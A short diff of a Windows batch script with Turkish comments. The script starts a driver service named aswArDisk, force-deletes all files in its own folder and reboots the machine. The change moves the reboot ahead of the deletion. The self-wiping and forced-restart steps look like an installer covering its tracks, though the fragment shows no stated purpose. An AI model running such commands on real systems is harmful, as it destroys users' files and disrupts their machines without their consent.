@@ -143,10 +143,10 @@ if exist "%~dp0aswArDisk.sys" (
     sc start aswArDisk
 )
 
+:: Sistemi 10 saniye sonra yeniden başlat
+C:\Windows\system32\cmd.exe /c shutdown /r /t 10
+
 :: Betiğin bulunduğu klasördeki tüm dosyaları sil
 del /q /f "%~dp0*.*"
-
-:: Sistemi yeniden başlat
-C:\Windows\system32\cmd.exe /c shutdown /r /t 5
 
 exit
